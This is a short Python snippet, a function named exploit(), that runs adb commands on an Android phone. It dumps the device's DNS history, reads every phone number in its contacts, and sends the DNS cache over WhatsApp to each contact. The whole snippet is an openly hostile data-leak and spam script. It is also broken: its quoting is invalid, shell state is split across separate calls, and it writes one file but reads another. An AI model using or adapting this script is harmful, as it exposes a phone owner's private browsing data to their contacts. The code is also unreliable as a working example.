
def exploit():
    print("\n")
    os.system("adb shell dumpsys netd dns > historial.txt")
    os.system("contacts=$(adb shell content query --uri content://com.android.contacts/data --projection data1 --where "mimetype='vnd.android.cursor.item/phone_v2'")
    os.system("while read -r phone_number; do adb shell am start -a android.intent.action.SEND -t text/plain -n com.whatsapp/.ContactPicker --es android.intent.extra.TEXT "$(cat dns_cache.txt)" --es android.intent.extra.SUBJECT "DNS Cache" --es jid "91${phone_number}@s.whatsapp.net"")
    os.system("done <<< "$contacts"")
